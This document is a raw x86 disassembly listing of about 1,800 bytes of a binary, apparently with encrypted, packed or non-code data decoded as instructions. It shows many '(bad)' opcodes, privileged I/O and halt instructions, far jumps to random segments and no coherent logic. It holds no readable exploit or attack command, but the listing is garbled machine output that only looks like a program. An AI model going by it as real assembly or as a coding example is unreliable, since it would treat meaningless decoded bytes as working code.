  40bcaa:	cld    
  40bcab:	in     eax,0x4c
  40bcad:	repnz test eax,0xe90a272a
  40bcb3:	rcl    edx,1
  40bcb5:	lods   eax,DWORD PTR ds:[esi]
  40bcb6:	adc    al,0x87
  40bcb8:	push   0xffffff9d
  40bcba:	aaa    
  40bcbb:	scas   eax,DWORD PTR es:[edi]
  40bcbc:	sub    al,0x95
  40bcbe:	xchg   edx,eax
  40bcbf:	jne    0x40bc8a
  40bcc1:	les    ebp,FWORD PTR [edx-0x5a]
  40bcc4:	xchg   BYTE PTR [ecx-0x59538cb6],dh
  40bcca:	inc    esi
  40bccb:	hlt    
  40bccc:	imul   edx,DWORD PTR [esi],0xd83c6d42
  40bcd2:	inc    esi
  40bcd3:	mov    BYTE PTR [ebp+0xa720063],ah
  40bcd9:	nop
  40bcda:	gs icebp 
  40bcdc:	lock xor eax,0x61d9f847
  40bce2:	adc    al,0x80
  40bce4:	lods   al,BYTE PTR ds:[esi]
  40bce5:	push   es
  40bce6:	or     eax,0xac33b58d
  40bceb:	dec    edx
  40bcec:	mov    DWORD PTR [esi-0x14],ebp
  40bcef:	xor    al,0x87
  40bcf1:	sbb    al,0x5d
  40bcf3:	out    0x7b,eax
  40bcf5:	sub    bh,BYTE PTR [ebx]
  40bcf7:	popa   
  40bcf8:	test   BYTE PTR [edx],dh
  40bcfa:	jge    0x40bcf2
  40bcfc:	mov    ah,0x2a
  40bcfe:	mov    eax,ds:0x6fb1c3ad
  40bd03:	in     al,0x2a
  40bd05:	sahf   
  40bd06:	jp     0x40bd0f
  40bd08:	sbb    ecx,esp
  40bd0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd0b:	adc    eax,0xd4303284
  40bd10:	jb     0x40bd80
  40bd12:	loop   0x40bccf
  40bd14:	and    BYTE PTR [eax],cl
  40bd16:	fld    TBYTE PTR [esi]
  40bd18:	jecxz  0x40bd87
  40bd1a:	inc    ebx
  40bd1c:	aas    
  40bd1d:	int    0x20
  40bd1f:	js     0x40bd3b
  40bd21:	xchg   dl,ah
  40bd23:	gs xor al,0x86
  40bd26:	mov    ds:0xd60fdeb8,eax
  40bd2b:	mov    cl,bl
  40bd2d:	aas    
  40bd2e:	jns    0x40bcff
  40bd30:	call   0xff3d:0x34221110
  40bd37:	and    edx,edx
  40bd39:	sbb    esi,DWORD PTR [edi+0xc4ff846]
  40bd3f:	sbb    DWORD PTR [ecx+ebp*4],ebp
  40bd42:	jge    0x40bd32
  40bd44:	ret    0x60f9
  40bd47:	xchg   esi,eax
  40bd48:	je     0x40bd46
  40bd4a:	cwde   
  40bd4b:	out    dx,al
  40bd4c:	xor    eax,DWORD PTR [eax]
  40bd4e:	lods   al,BYTE PTR ds:[esi]
  40bd4f:	jns    0x40bda4
  40bd51:	clc    
  40bd52:	xchg   edi,eax
  40bd53:	dec    ecx
  40bd54:	fxtract 
  40bd56:	inc    ebx
  40bd57:	jl     0x40bd8d
  40bd59:	popa   
  40bd5a:	fucom  st(2)
  40bd5c:	int3   
  40bd5d:	into   
  40bd5e:	lods   eax,DWORD PTR fs:[esi]
  40bd60:	mov    dh,BYTE PTR [ebp+0x3c7ce725]
  40bd66:	or     eax,0xb515884f
  40bd6b:	(bad)  
  40bd6c:	mov    eax,0x2289b2fb
  40bd71:	dec    edx
  40bd72:	xchg   ecx,eax
  40bd73:	(bad)  
  40bd74:	mov    DWORD PTR ss:[esi-0xf024d60],edi
  40bd7b:	hlt    
  40bd7c:	lds    edx,FWORD PTR [eax+0x7e]
  40bd7f:	pop    es
  40bd80:	inc    ecx
  40bd81:	leave  
  40bd82:	arpl   WORD PTR [edx],bx
  40bd84:	jmp    0xf820d4fe
  40bd89:	in     al,0xf2
  40bd8b:	add    ebx,DWORD PTR [edi+0x51ef664f]
  40bd91:	mov    ebx,0x3e845071
  40bd96:	loop   0x40bd7f
  40bd98:	and    eax,DWORD PTR [edi-0x23]
  40bd9b:	mov    ecx,0x8723ecfd
  40bda0:	pusha  
  40bda1:	loopne 0x40bd88
  40bda3:	sahf   
  40bda4:	pop    eax
  40bda5:	daa    
  40bda6:	sub    ebx,edi
  40bda8:	es fwait
  40bdaa:	rcr    DWORD PTR [eax],cl
  40bdac:	push   ebp
  40bdad:	cmp    dh,BYTE PTR [esi-0x2b]
  40bdb0:	mov    eax,0xcba02262
  40bdb5:	enter  0xe781,0x1e
  40bdb9:	xor    eax,DWORD PTR [edx+eax*4-0x4ffb20f6]
  40bdc0:	or     DWORD PTR [eax+0x4a05c82b],0x35550c57
  40bdca:	adc    eax,0xba7c84e3
  40bdcf:	std    
  40bdd0:	mov    eax,ds:0x681152d6
  40bdd5:	repnz mov eax,ds:0x25413127
  40bddb:	adc    al,0x5e
  40bddd:	mov    edi,DWORD PTR [ebx+0x6ebee48c]
  40bde3:	jecxz  0x40be0e
  40bde5:	ins    DWORD PTR es:[edi],dx
  40bde6:	dec    esp
  40bde7:	fldenv [ecx+edx*2-0x25]
  40bdeb:	in     eax,0xbe
  40bded:	cmp    eax,0x91bc8cc7
  40bdf2:	xor    al,ah
  40bdf4:	jnp    0x40be4d
  40bdf6:	cmp    BYTE PTR [edx+0x1b],ah
  40bdf9:	ret    0x2e3c
  40bdfc:	sbb    al,0x99
  40bdfe:	addr16 adc edx,eax
  40be01:	push   esp
  40be02:	mov    esp,esi
  40be04:	js     0x40bd92
  40be06:	rep lods eax,DWORD PTR ds:[esi]
  40be08:	jg     0x40bd99
  40be0a:	cld    
  40be0b:	retf   
  40be0c:	mov    ah,0x36
  40be0e:	add    al,0x1b
  40be10:	fwait
  40be11:	cmp    DWORD PTR ds:0x3576e4c,eax
  40be17:	dec    ebx
  40be18:	mov    bh,0xb7
  40be1a:	fsub   st(5),st
  40be1c:	sbb    al,0x2c
  40be1e:	aad    0xc3
  40be20:	xchg   edx,eax
  40be21:	retf   
  40be22:	sub    BYTE PTR [ebx-0x14],bl
  40be25:	je     0x40bea4
  40be27:	push   ss
  40be28:	stc    
  40be29:	mov    bh,0x1f
  40be2b:	test   ch,bl
  40be2d:	cs and eax,0x718f9b0b
  40be33:	xchg   ebp,eax
  40be34:	dec    edi
  40be35:	icebp  
  40be36:	call   0xe053:0xb44d7fda
  40be3d:	in     al,dx
  40be3e:	int    0x9f
  40be40:	addr16 into 
  40be42:	pop    ebx
  40be43:	daa    
  40be44:	mov    ch,0x5
  40be46:	nop
  40be47:	and    BYTE PTR [eax+eax*1-0x5f],cl
  40be4b:	dec    ebp
  40be4c:	lahf   
  40be4d:	retf   0x3a3b
  40be50:	mov    DWORD PTR [ecx+0x33],esi
  40be53:	jne    0x40be7c
  40be55:	jbe    0x40bec6
  40be57:	and    cl,BYTE PTR [ecx+esi*8]
  40be5a:	ins    BYTE PTR es:[edi],dx
  40be5b:	ret    
  40be5c:	xchg   edi,eax
  40be5d:	mov    ds:0xd60545a3,eax
  40be62:	rcl    BYTE PTR [edx],cl
  40be64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be65:	inc    eax
  40be66:	mov    esp,0x81ca7242
  40be6b:	in     al,dx
  40be6c:	(bad)  
  40be6d:	jmp    0x719e:0xa331099
  40be74:	ret    
  40be75:	jecxz  0x40be7b
  40be77:	sbb    eax,DWORD PTR [edx]
  40be79:	xor    eax,0x6b31633a
  40be7e:	daa    
  40be7f:	jne    0x40bea3
  40be81:	adc    DWORD PTR [ecx+0x58],esp
  40be84:	mov    ebp,0x361dd6dc
  40be89:	push   ecx
  40be8a:	sub    DWORD PTR [ebx],esi
  40be8c:	and    edx,0x69
  40be8f:	xchg   BYTE PTR [edx-0x38f684d8],ch
  40be95:	xor    eax,0xaf476fb9
  40be9a:	mov    esi,0x34c31496
  40be9f:	adc    cl,0x4d
  40bea2:	sub    DWORD PTR [eax+0x4d],edx
  40bea5:	sbb    BYTE PTR [esi+edi*4+0x1c7a92b1],dl
  40beac:	push   0x16581587
  40beb1:	adc    cl,BYTE PTR [esi+0x5c67d787]
  40beb7:	and    al,0x4a
  40beb9:	push   ss
  40beba:	jnp    0x40bf1b
  40bebc:	push   edx
  40bebd:	int    0xeb
  40bebf:	push   ecx
  40bec0:	sub    DWORD PTR [edx],edi
  40bec2:	cmp    BYTE PTR [ebx-0x7f],cl
  40bec5:	nop
  40bec6:	pop    ecx
  40bec7:	pop    ebx
  40bec8:	nop
  40bec9:	xor    BYTE PTR [ecx+0x43638bc3],bh
  40becf:	pop    edi
  40bed0:	cs daa 
  40bed2:	jl     0x40bf0c
  40bed4:	jl     0x40be86
  40bed6:	xor    al,BYTE PTR [eax+0x5c]
  40bed9:	sbb    DWORD PTR [edi-0x6db3e2aa],0xffffffd8
  40bee0:	mov    ds:0x4060d91e,al
  40bee5:	sbb    edi,ebp
  40bee7:	rcl    DWORD PTR ds:0xd7192a40,0x24
  40beee:	punpckhbw mm2,mm1
  40bef1:	push   edi
  40bef2:	fnstenv [ecx]
  40bef4:	gs stos DWORD PTR es:[edi],eax
  40bef6:	les    edi,FWORD PTR [eax]
  40bef8:	push   esi
  40bef9:	adc    BYTE PTR [ebx+0x7e],bh
  40befc:	in     al,0xbb
  40befe:	jbe    0x40bea2
  40bf00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf01:	jno    0x40bef5
  40bf03:	push   esi
  40bf04:	inc    eax
  40bf05:	add    DWORD PTR [ebx-0x5c],ebp
  40bf08:	mov    BYTE PTR [esi],al
  40bf0a:	mov    ah,BYTE PTR [edi]
  40bf0c:	mov    WORD PTR [eax],?
  40bf0e:	lods   al,BYTE PTR ds:[esi]
  40bf0f:	bound  esi,QWORD PTR [esi-0x43]
  40bf12:	mov    dh,0x2b
  40bf14:	pushf  
  40bf15:	pop    ebp
  40bf16:	mov    ecx,esi
  40bf18:	inc    ecx
  40bf19:	clc    
  40bf1a:	test   al,0x40
  40bf1c:	aaa    
  40bf1d:	sub    bl,BYTE PTR [esi+0x160a8a46]
  40bf23:	pushf  
  40bf24:	(bad)  
  40bf25:	je     0x40befb
  40bf27:	out    0xd1,eax
  40bf29:	test   al,0xe6
  40bf2b:	xchg   ebx,eax
  40bf2c:	rol    cl,1
  40bf2e:	or     DWORD PTR [eax-0x72],eax
  40bf31:	and    al,BYTE PTR [esp+ebp*4-0x695cf4ca]
  40bf38:	mov    dl,0xc
  40bf3a:	mov    esp,0x1e169528
  40bf3f:	fld    QWORD PTR [edx+0x62c377e8]
  40bf45:	push   ebx
  40bf46:	sbb    BYTE PTR fs:[edx],cl
  40bf49:	push   edx
  40bf4a:	mov    cl,0x66
  40bf4c:	(bad)  
  40bf4d:	mov    dl,0xbc
  40bf4f:	out    0x8b,eax
  40bf51:	lock or eax,edi
  40bf54:	sbb    cl,al
  40bf56:	mov    esi,0x6982e3b1
  40bf5b:	mov    edx,0xa3671bf2
  40bf60:	sbb    eax,0x1edc11fe
  40bf65:	aaa    
  40bf66:	mov    bl,0x98
  40bf68:	enter  0x8b1e,0x98
  40bf6c:	test   eax,0x59f804dd
  40bf71:	cwde   
  40bf72:	xor    eax,ebx
  40bf74:	fwait
  40bf75:	bound  eax,QWORD PTR [ebx+edi*4]
  40bf78:	sbb    esp,DWORD PTR [ecx+ebx*4-0x80]
  40bf7c:	jge    0x40bf47
  40bf7e:	sub    al,0x95
  40bf80:	and    al,0x1b
  40bf82:	aam    0xa0
  40bf84:	stos   BYTE PTR es:[edi],al
  40bf85:	hlt    
  40bf86:	call   0x4dd7bebb
  40bf8b:	sub    BYTE PTR [edx],dl
  40bf8d:	add    dh,BYTE PTR [esi-0x51cf2b12]
  40bf93:	mov    edi,0xb1eafb0e
  40bf98:	(bad)  
  40bf99:	inc    ecx
  40bf9a:	in     eax,dx
  40bf9b:	pusha  
  40bf9c:	out    0xfa,al
  40bf9e:	sub    al,0xe7
  40bfa0:	fwait
  40bfa1:	mov    ebp,0x761a4df1
  40bfa6:	into   
  40bfa7:	push   ebp
  40bfa8:	xor    DWORD PTR [ebx],edi
  40bfaa:	mov    ah,0xcd
  40bfac:	mov    ah,0x70
  40bfae:	scas   eax,DWORD PTR es:[edi]
  40bfaf:	pop    ecx
  40bfb0:	xchg   esp,eax
  40bfb1:	pop    ebp
  40bfb2:	sbb    DWORD PTR [edx+ebx*1+0x7a],edx
  40bfb6:	lds    edi,FWORD PTR [ecx+eax*8-0x2682c894]
  40bfbd:	ja     0x40c03d
  40bfbf:	(bad)  
  40bfc1:	mov    ebp,0xe66f1b42
  40bfc6:	sub    al,0xa
  40bfc8:	icebp  
  40bfc9:	in     eax,0x84
  40bfcb:	(bad)  
  40bfcc:	cmp    DWORD PTR [edx-0x6a],ecx
  40bfcf:	dec    esi
  40bfd0:	arpl   WORD PTR [ecx-0x1e],sp
  40bfd3:	xchg   esi,eax
  40bfd4:	into   
  40bfd5:	adc    BYTE PTR [ebx-0x5951fcf4],0xd5
  40bfdc:	inc    ebx
  40bfdd:	ins    BYTE PTR es:[edi],dx
  40bfde:	call   0x4164876d
  40bfe3:	cmp    eax,0xf0810056
  40bfe8:	jmp    0x6047c5af
  40bfed:	sub    BYTE PTR [esi-0x5],al
  40bff0:	rcl    BYTE PTR [esi+eax*2],1
  40bff3:	out    dx,al
  40bff4:	popa   
  40bff5:	xchg   DWORD PTR [edi+0xd],esi
  40bff8:	pop    ebx
  40bff9:	std    
  40bffa:	(bad)  
  40bffc:	inc    ebx
  40bffd:	pop    esi
  40bffe:	mov    bl,0xec
  40c000:	pop    ds
  40c001:	sub    al,0xce
  40c003:	xchg   edi,eax
  40c004:	pop    edx
  40c005:	dec    edx
  40c006:	lods   al,BYTE PTR ds:[esi]
  40c007:	sbb    al,0x41
  40c009:	xor    cl,bl
  40c00b:	mov    ch,0x1b
  40c00d:	push   esi
  40c00e:	outs   dx,BYTE PTR ds:[esi]
  40c00f:	sahf   
  40c010:	mov    dl,cl
  40c012:	add    DWORD PTR [ebx],ebp
  40c014:	or     al,0x80
  40c016:	scas   al,BYTE PTR es:[edi]
  40c017:	cli    
  40c018:	push   ebx
  40c019:	jg     0x40c053
  40c01b:	(bad)  
  40c01c:	dec    esi
  40c01d:	cld    
  40c01e:	cmc    
  40c01f:	xlat   BYTE PTR ds:[ebx]
  40c020:	sbb    ebp,esp
  40c022:	fdiv   QWORD PTR [eax-0x168d3330]
  40c028:	hlt    
  40c029:	inc    edi
  40c02a:	addr16 xchg edi,eax
  40c02c:	sub    bl,BYTE PTR [edi+eiz*8-0x7c]
  40c030:	popf   
  40c031:	push   cs
  40c032:	rol    edi,1
  40c034:	add    DWORD PTR [edx],0x5c
  40c037:	loopne 0x40bff4
  40c039:	arpl   WORD PTR [ebx-0x54892bdc],di
  40c03f:	stos   BYTE PTR es:[edi],al
  40c040:	test   BYTE PTR [ebx+eiz*1-0x7a],bh
  40c044:	fwait
  40c045:	icebp  
  40c046:	cmp    eax,DWORD PTR [ecx+0x372e797c]
  40c04c:	or     dh,dh
  40c04e:	aaa    
  40c04f:	cs fyl2xp1 
  40c052:	rol    ah,0x36
  40c055:	mov    ebp,0x4bf2b03e
  40c05a:	retf   
  40c05b:	mov    ecx,0x4a4f2437
  40c060:	imul   eax,DWORD PTR [ebp+0x17],0x2a05c838
  40c067:	mov    al,ds:0x60457b5c
  40c06c:	sub    eax,0xb1c3bed0
  40c071:	cmp    al,0xc5
  40c073:	or     edi,DWORD PTR [eax-0x3f91641]
  40c079:	inc    edx
  40c07a:	adc    bl,bh
  40c07c:	mov    ds:0xa9868a40,al
  40c081:	dec    esp
  40c082:	xchg   ecx,eax
  40c083:	sbb    DWORD PTR [edi+0x598f03ed],ebp
  40c089:	fldenv [edx]
  40c08b:	jecxz  0x40c10c
  40c08d:	imul   esp,edi,0x17
  40c090:	loopne 0x40c0a4
  40c092:	push   es
  40c093:	and    bh,BYTE PTR [ebp-0x13f6885b]
  40c099:	shl    ah,0x25
  40c09c:	pop    eax
  40c09d:	pop    edx
  40c09e:	leave  
  40c09f:	mov    ebx,0xe38f69c4
  40c0a4:	mov    ah,0x9c
  40c0a6:	loope  0x40c0c6
  40c0a8:	cs inc ebx
  40c0aa:	jp     0x40c061
  40c0ac:	cwde   
  40c0ad:	xchg   esp,eax
  40c0ae:	xor    BYTE PTR [edx],dl
  40c0b0:	lahf   
  40c0b1:	lea    edx,[edi+eax*2-0x1071165a]
  40c0b8:	pop    esp
  40c0b9:	xchg   ebx,eax
  40c0ba:	jmp    0x7130891d
  40c0bf:	scas   al,BYTE PTR es:[edi]
  40c0c0:	cwde   
  40c0c1:	pop    esp
  40c0c2:	adc    edi,DWORD PTR [ebp-0x4f7a042b]
  40c0c8:	and    edi,ecx
  40c0ca:	test   ax,0x4703
  40c0ce:	rol    DWORD PTR [ecx+ebx*2-0x13],0xc5
  40c0d3:	mov    edi,0xdc5959ad
  40c0d8:	jnp    0x40c0ec
  40c0da:	fdiv   DWORD PTR [esi]
  40c0dc:	mov    edi,0x25bb9552
  40c0e1:	inc    eax
  40c0e2:	jg     0x40c13a
  40c0e4:	or     al,0xf2
  40c0e6:	mov    ch,0xf2
  40c0e8:	retf   
  40c0e9:	inc    edx
  40c0ea:	aam    0x48
  40c0ec:	and    BYTE PTR [ecx+0x69],0xea
  40c0f0:	pop    esi
  40c0f1:	fmul   DWORD PTR [ebx+edx*8-0x28]
  40c0f5:	jmp    0x1aedd444
  40c0fa:	sbb    DWORD PTR [ecx-0x51],eax
  40c0fd:	lods   eax,DWORD PTR ds:[esi]
  40c0fe:	add    eax,0x233f91ff
  40c103:	in     eax,dx
  40c104:	adc    al,0xd7
  40c107:	enter  0xcc3d,0x41
  40c10b:	and    DWORD PTR [ecx],edx
  40c10d:	pop    edx
  40c10e:	mov    DWORD PTR [esi+0xd55d892],edx
  40c114:	(bad)  
  40c116:	fistp  QWORD PTR [eax+0x747b8b90]
  40c11c:	cmp    dl,0x18
  40c11f:	(bad)  
  40c120:	or     dh,BYTE PTR [eax+0x2a5da969]
  40c126:	loopne 0x40c145
  40c128:	clc    
  40c129:	shl    cl,0xa3
  40c12c:	or     esi,ecx
  40c12e:	mov    ah,0x2a
  40c130:	stos   DWORD PTR es:[edi],eax
  40c131:	aam    0x46
  40c133:	arpl   WORD PTR [ebp+0x2b5f4297],bx
  40c139:	rol    BYTE PTR [eax+0x24],cl
  40c13c:	(bad)  [ebp+0x7f]
  40c13f:	pop    eax
  40c140:	cmp    ah,BYTE PTR [ebp+0x7f8fa61e]
  40c146:	dec    eax
  40c147:	arpl   WORD PTR [esi-0x3c0fa94b],ax
  40c14d:	rcl    DWORD PTR ds:0x60d65797,0x8f
  40c154:	jmp    0x3ffb:0x952bd605
  40c15b:	inc    esi
  40c15c:	mov    dh,0xff
  40c15e:	jbe    0x40c12b
  40c160:	mov    edi,0x7679126f
  40c165:	or     ah,al
  40c167:	pushf  
  40c168:	mov    esi,0x4a9bab0a
  40c16d:	mov    ebp,0x5f32f9e5
  40c172:	add    BYTE PTR [edx],cl
  40c174:	stc    
  40c175:	xlat   BYTE PTR ds:[ebx]
  40c176:	mov    ch,BYTE PTR [ecx+esi*2-0x2b]
  40c17a:	xor    DWORD PTR [ebx-0x3476c2ac],ecx
  40c180:	jecxz  0x40c194
  40c182:	sbb    al,BYTE PTR [ecx-0x71]
  40c185:	lock lods eax,DWORD PTR ds:[esi]
  40c187:	out    dx,al
  40c188:	out    dx,eax
  40c189:	pusha  
  40c18a:	ror    DWORD PTR [edi+0x7b],cl
  40c18d:	sub    al,0xc9
  40c18f:	popa   
  40c190:	cld    
  40c191:	mov    esi,0x6b5d0e5
  40c196:	sub    al,0xa7
  40c198:	out    dx,al
  40c199:	ret    
  40c19a:	adc    ah,al
  40c19c:	bound  esp,QWORD PTR [ecx-0x2bda066b]
  40c1a2:	scas   al,BYTE PTR es:[edi]
  40c1a3:	jb     0x40c166
  40c1a5:	leave  
  40c1a6:	ins    DWORD PTR es:[edi],dx
  40c1a7:	xor    BYTE PTR [esi-0x597e4036],al
  40c1ad:	popa   
  40c1ae:	rol    BYTE PTR [ecx],cl
  40c1b0:	adc    ecx,DWORD PTR [edi+0x62]
  40c1b3:	push   es
  40c1b4:	out    dx,al
  40c1b5:	pop    eax
  40c1b6:	lock mov bl,0xcd
  40c1b9:	fsub   st,st(0)
  40c1bb:	mov    DWORD PTR [bx+di+0x14],ebx
  40c1bf:	cwde   
  40c1c0:	popf   
  40c1c1:	jmp    0x40c22e
  40c1c3:	mov    dl,dl
  40c1c5:	push   ebp
  40c1c6:	data16 loop 0x40c156
  40c1c9:	cmc    
  40c1ca:	stos   BYTE PTR es:[edi],al
  40c1cb:	mov    edi,0x14d0d1a1
  40c1d0:	inc    edx
  40c1d1:	and    edi,DWORD PTR [eax+0x48]
  40c1d4:	push   0x67429094
  40c1d9:	pop    ebp
  40c1da:	inc    esi
  40c1db:	int3   
  40c1dc:	imul   BYTE PTR [esi-0x631b6bc8]
  40c1e2:	inc    esi
  40c1e3:	clc    
  40c1e4:	lock mov ah,0x56
  40c1e7:	mov    al,0x28
  40c1e9:	dec    eax
  40c1ea:	je     0x40c221
  40c1ec:	in     al,0x5c
  40c1ee:	aas    
  40c1ef:	mov    bl,0x60
  40c1f1:	nop
  40c1f2:	out    0x3a,al
  40c1f4:	xlat   BYTE PTR ds:[ebx]
  40c1f5:	fcomp  QWORD PTR [ebp+0x15]
  40c1f8:	adc    al,0xef
  40c1fa:	cmovae esp,eax
  40c1fd:	pop    es
  40c1fe:	jp     0x40c255
  40c200:	and    BYTE PTR [ebx+0x6b8d7c91],ch
  40c206:	shl    ch,cl
  40c208:	pushf  
  40c209:	pop    ds
  40c20a:	mov    ebp,0xb8eef4d
  40c20f:	arpl   WORD PTR [ecx],si
  40c211:	dec    esp
  40c212:	xchg   ebx,eax
  40c213:	xchg   BYTE PTR [ecx-0x57650777],ah
  40c219:	xor    DWORD PTR [ecx],esp
  40c21b:	ins    BYTE PTR es:[edi],dx
  40c21c:	(bad)  [edx]
  40c21e:	into   
  40c21f:	fist   WORD PTR [esi+0x7]
  40c222:	ficom  WORD PTR [edx]
  40c224:	imul   edx,DWORD PTR [edi-0x28],0xffffffc0
  40c228:	stos   BYTE PTR es:[edi],al
  40c229:	xchg   esp,eax
  40c22b:	mov    bl,0x73
  40c22d:	pop    edx
  40c22e:	push   edx
  40c22f:	call   0x4880a274
  40c234:	sbb    ebx,DWORD PTR [ecx+0x0]
  40c237:	sbb    al,0x37
  40c239:	clts   
  40c23b:	jo     0x40c279
  40c23d:	popa   
  40c23e:	mov    bl,0x35
  40c240:	and    al,0x52
  40c242:	or     al,0x2e
  40c244:	cli    
  40c245:	jp     0x40c239
  40c247:	and    al,BYTE PTR [ecx-0x32]
  40c24a:	sbb    eax,0x93c6a46
  40c24f:	push   es
  40c250:	addr16 push esp
  40c252:	sbb    DWORD PTR [edi],ebp
  40c254:	(bad)  
  40c256:	je     0x40c221
  40c258:	mov    bl,0xa9
  40c25a:	cmp    ah,bh
  40c25c:	pop    edx
  40c25d:	ins    DWORD PTR es:[edi],dx
  40c25e:	adc    eax,0xffffffb6
  40c261:	mov    bh,0xa6
  40c263:	or     edx,ebx
  40c265:	sti    
  40c266:	adc    ebp,DWORD PTR [esi]
  40c268:	aaa    
  40c269:	push   esi
  40c26a:	(bad)  
  40c26b:	jmp    0xfeb6f1bb
  40c270:	or     eax,0x402776e6
  40c275:	or     esp,edx
  40c277:	or     edx,DWORD PTR [eax]
  40c279:	sub    ah,BYTE PTR [esi-0x23]
  40c27c:	rol    BYTE PTR [edi+0x22],0x68
  40c280:	push   edx
  40c281:	call   0x8e7f1596
  40c286:	mov    esp,0xc5ce6ddb
  40c28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c28c:	aad    0x9e
  40c28e:	clc    
  40c28f:	stos   BYTE PTR es:[edi],al
  40c290:	xchg   edi,eax
  40c291:	pop    ds
  40c292:	pusha  
  40c293:	or     bl,BYTE PTR [eax+0x5b83d3e9]
  40c299:	out    0x6,al
  40c29b:	imul   BYTE PTR [eax]
  40c29d:	pop    esp
  40c29e:	arpl   WORD PTR ds:0xa7124bf6,ax
  40c2a4:	mov    esp,eax
  40c2a6:	cmp    al,0x49
  40c2a8:	and    bl,BYTE PTR [ebx]
  40c2aa:	dec    esp
  40c2ab:	xor    BYTE PTR [esi-0x7a],ch
  40c2ae:	hlt    
  40c2af:	shl    DWORD PTR [edi+0x7191df33],0x13
  40c2b6:	xchg   esp,eax
  40c2b7:	dec    ebp
  40c2b8:	inc    edi
  40c2b9:	cmp    BYTE PTR gs:[eax-0x48e2d90a],0xe1
  40c2c1:	stc    
  40c2c2:	sbb    esi,edi
  40c2c4:	sub    dh,dl
  40c2c6:	fcomp  QWORD PTR [ecx-0x682bcab4]
  40c2cc:	ret    
  40c2cd:	xor    dl,ch
  40c2cf:	or     al,0x12
  40c2d1:	idiv   DWORD PTR [ebx+0x1c7e8013]
  40c2d7:	pop    esi
  40c2d8:	inc    esi
  40c2d9:	rcl    DWORD PTR [eax+0xc4a6653],1
  40c2df:	ret    
  40c2e0:	xchg   esp,eax
  40c2e1:	sub    esi,0x6af7a313
  40c2e7:	test   BYTE PTR [eax+0x385acf1b],dl
  40c2ed:	repz rol BYTE PTR [esi-0x2e4cfce1],0x5
  40c2f5:	(bad)  
  40c2f6:	mov    eax,ds:0x693f347d
  40c2fb:	cmp    eax,0x3ba39455
  40c300:	dec    edx
  40c301:	add    eax,0x64a11706
  40c306:	adc    cl,bl
  40c308:	adc    BYTE PTR [eax-0x2b],bl
  40c30b:	test   DWORD PTR [ebx],0x58959c7a
  40c311:	addr16 mov al,ds:0x1734
  40c315:	pop    ebx
  40c316:	pushf  
  40c317:	mov    ecx,0xb6bf264f
  40c31c:	ret    0x522f
  40c31f:	sub    ebx,DWORD PTR [ebx-0x7baf60f4]
  40c325:	shl    DWORD PTR [edi+0x21],1
  40c328:	repz into 
  40c32a:	into   
  40c32b:	scas   al,BYTE PTR es:[edi]
  40c32c:	mov    edx,esp
  40c32e:	mov    dl,0xb8
  40c330:	mov    eax,ds:0x156c3c98
  40c335:	add    DWORD PTR [ebp+ebp*8+0x4926b1ea],ebp
  40c33c:	std    
  40c33d:	cmp    al,BYTE PTR [esi]
  40c33f:	mov    ecx,?
  40c341:	mov    al,0xb3
  40c343:	push   es
  40c344:	xchg   ebp,eax
  40c345:	das    
  40c346:	inc    ebx
  40c347:	push   es
  40c348:	mov    cl,0x9d
  40c34a:	mov    eax,0x87ed4bb7
  40c34f:	and    eax,0x5e799885
  40c354:	pop    ss
  40c355:	push   es
  40c356:	push   edx
  40c357:	(bad)  
  40c358:	push   edx
  40c359:	and    esi,ebp
  40c35b:	and    eax,0x133f474e
  40c360:	sub    eax,0xc7648196
  40c365:	xchg   ebp,eax
  40c366:	mov    ecx,0x6b8c1dca
  40c36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c36c:	add    ebp,DWORD PTR [esi-0x43a7c76e]
  40c372:	mov    ebx,esp
  40c374:	(bad)  
  40c375:	(bad)  [edi]
  40c377:	(bad)  
  40c378:	shr    DWORD PTR ds:0xfbf2963f,1
  40c37e:	mov    esi,0x846a6d8b
  40c383:	jmp    0x52805106
  40c388:	jl     0x40c389
  40c38a:	xchg   esi,eax
  40c38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c38c:	shl    BYTE PTR [ebp-0x38],1
  40c38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c390:	in     al,0x7d
  40c392:	(bad)  
  40c393:	xor    DWORD PTR [di],ecx
  40c396:	add    eax,0x8fca2f9c
  40c39b:	cmp    cl,BYTE PTR [ecx-0x5]
  40c39e:	aaa    
  40c39f:	mov    dh,0x76
  40c3a1:	shl    BYTE PTR [edx],1
  40c3a3:	cdq    
  40c3a4:	jb     0x40c40c
  40c3a6:	inc    ebp
  40c3a7:	xchg   ebp,eax
  40c3a8:	jmp    0x40c3d0
  40c3aa:	aas    
  40c3ab:	(bad)  
  40c3ac:	adc    eax,0x3885c60c
  40c3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b2:	sbb    esp,DWORD PTR [ecx]
  40c3b4:	xchg   BYTE PTR [edx+0x46],dl
  40c3b7:	xchg   ax,sp
  40c3ba:	fs test al,0x32
  40c3bd:	cdq    
  40c3be:	arpl   bx,bx
  40c3c0:	scas   al,BYTE PTR es:[edi]
  40c3c1:	jg     0x40c436
  40c3c3:	mov    bh,0xe
  40c3c5:	shl    DWORD PTR [esp+ecx*8-0x70b396b7],1
  40c3cc:	scas   eax,DWORD PTR es:[edi]
  40c3cd:	rcr    DWORD PTR [ecx+0x4f],1
  40c3d0:	call   DWORD PTR [esi]
  40c3d2:	popa   
  40c3d3:	jns    0x40c428
  40c3d5:	dec    ebx
  40c3d6:	xchg   esi,eax
  40c3d7:	cmp    WORD PTR [esp+edi*1],bp
  40c3db:	push   0x3b
  40c3dd:	int    0x3d
  40c3df:	ins    BYTE PTR es:[edi],dx
  40c3e0:	adc    DWORD PTR [esp+ecx*2+0x17],esp
  40c3e4:	push   ecx
  40c3e5:	xchg   ebp,eax
  40c3e6:	push   cs
  40c3e7:	or     BYTE PTR [eax+0x22],ch
  40c3ea:	xchg   ebp,eax
  40c3eb:	leave  
  40c3ec:	xchg   esp,eax
  40c3ed:	jno    0x40c389
  40c3ef:	fadd   DWORD PTR [eax-0x7a]
  40c3f2:	into   
  40c3f3:	sub    WORD PTR [edx],dx
  40c3f6:	sub    al,cl
  40c3f8:	inc    esp
  40c3f9:	sub    BYTE PTR [edi],cl
  40c3fb:	xchg   edx,eax
  40c3fc:	das    
  40c3fd:	push   ss
  40c3fe:	std    
  40c3ff:	xchg   ebx,eax
